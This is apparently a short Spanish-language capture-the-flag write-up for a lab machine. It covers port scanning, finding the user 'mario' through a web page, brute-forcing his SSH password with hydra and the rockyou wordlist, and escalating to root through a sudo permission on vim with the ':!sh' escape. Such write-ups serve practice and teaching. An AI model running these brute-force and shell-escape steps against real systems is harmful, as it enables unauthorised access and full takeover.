PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos enumeración web y encontramos la siguiente ruta:
	/secret.php

-Entramos y sale el siguiente texto:
	-Hola Mario , esta web no se puede hackear
	-Esto nos da a entender que existe un usuario llamado mario

-Intentamos enumerar más directorios desde la ruta /secret.php pero no encontramos nada

-Hacemos fuerza bruta con hydra al servicio ssh con el usuario mario:
	-hydra ssh://172.20.0.2 -l mario -P /usr/share/wordlists/rockyou.txt
		-[ssh] host: 172.20.0.2   login: mario   password: chocolate

-Nos autenticamos por ssh con las credenciales obtenidas


## Escalada de privilegios

-Vemos que comandos podemos ejecutar como root:
	-sudo -l:
		(ALL) /usr/bin/vim

-Abusamos de /usr/bin/vim:
	sudo /usr/bin/vim
	-Cuando se abre hacemos esto:
		-Control + C --> :!sh


# whoami
root